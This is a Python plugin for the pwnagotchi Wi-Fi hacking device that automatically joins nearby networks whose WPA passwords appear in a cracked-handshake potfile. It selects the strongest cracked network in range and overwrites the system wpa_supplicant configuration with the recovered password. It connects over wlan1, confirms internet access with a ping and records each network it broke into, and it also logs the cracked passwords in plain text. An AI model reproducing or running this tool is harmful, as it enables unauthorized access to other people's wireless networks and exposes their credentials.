import logging
import os
from pwnagotchi import plugins
import subprocess

class ConnectOut(plugins.Plugin):
    __author__ = 'NeonLightning'
    __version__ = '1.0.0'
    __license__ = 'GPL4'
    __description__ = 'check validity of cracked nearby connections'

    def on_loaded(self):
        logging.info("[ConnectOut] loaded")

    def on_unfiltered_ap_list(self, agent, access_points):
        potfile_path = "/root/handshakes/wpa-sec.cracked.potfile"
        successful_potfile_path = "/root/handshakes/successful.wpa-sec.cracked.potfile"
        logging.info("[ConnectOut] Checking if successful potfile exists...")
        if not os.path.exists(successful_potfile_path):
            logging.info("[ConnectOut] Successful potfile does not exist. Creating...")
            open(successful_potfile_path, 'a').close()
        logging.info("[ConnectOut] Reading cracked networks from potfile...")
        cracked_networks = {}
        with open(potfile_path, 'r') as f:
            potfile_lines = f.readlines()
            for line in potfile_lines:
                parts = line.strip().split(':')
                if len(parts) >= 4:
                    ssid = parts[2]
                    cracked_networks[ssid] = line.strip()
                    logging.info(f"[ConnectOut] Found cracked network: {ssid}")
        logging.info("[ConnectOut] Reading processed SSIDs from successful potfile...")
        processed_ssids = set()
        if os.path.exists(successful_potfile_path):
            with open(successful_potfile_path, 'r') as f:
                for line in f.readlines():
                    parts = line.strip().split(':')
                    if len(parts) >= 4:
                        ssid = parts[2]
                        processed_ssids.add(ssid)
                        logging.info(f"[ConnectOut] Found processed SSID: {ssid}")
        logging.info("[ConnectOut] Evaluating unfiltered access points...")
        strongest_signal = -100
        selected_network = None
        for network in access_points:
            ssid = network['ssid']
            logging.info(f"[ConnectOut] Found network: {ssid} with signal strength: {network['rssi']}")
            if ssid in cracked_networks and network['rssi'] > strongest_signal and ssid not in processed_ssids:
                strongest_signal = network['rssi']
                selected_network = network
                logging.info(f"[ConnectOut] Selected network: {ssid} with signal strength: {strongest_signal}")

        if selected_network is None:
            logging.info("[ConnectOut] No cracked network with a strong signal found.")
            return
        logging.info(f"[ConnectOut] Preparing WPA supplicant configuration for network: {selected_network['ssid']}")
        config_content = f'''
        ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
        update_config=1
        country=US

        network={{
            ssid="{selected_network['ssid']}"
            psk="{cracked_networks[selected_network['ssid']].split(':')[-1]}"
        }}
        '''
        config_file = "/etc/wpa_supplicant/wpa_supplicant.conf"
        with open(config_file, 'w+') as f:
            f.write(config_content)
        logging.info(f"[ConnectOut] Connecting to {selected_network['ssid']} with password {cracked_networks[selected_network['ssid']].split(':')[-1]}")
        logging.info("[ConnectOut] Bringing up wlan1 interface...")
        subprocess.run(["ip", "link", "set", "wlan1", "up"])
        logging.info("[ConnectOut] Starting WPA supplicant...")
        subprocess.run(["wpa_supplicant", "-B", "-i", "wlan1", "-c", config_file])
        logging.info("[ConnectOut] Running DHCP client...")
        subprocess.run(["dhclient", "wlan1"])
        logging.info("[ConnectOut] Pinging google.com to verify connection...")
        ping_result = subprocess.run(['ping', '-I', 'wlan1', '-c', '1', 'google.com'], stdout=subprocess.PIPE)
        if ping_result.returncode == 0:
            logging.info("[ConnectOut] Ping to google.com successful")
            with open(successful_potfile_path, 'a') as f:
                f.write(cracked_networks[selected_network['ssid']] + '\n')
        else:
            logging.info("[ConnectOut] Ping to google.com failed")
        logging.info("[ConnectOut] Killing WPA supplicant process...")
        subprocess.run(["killall", "wpa_supplicant"])
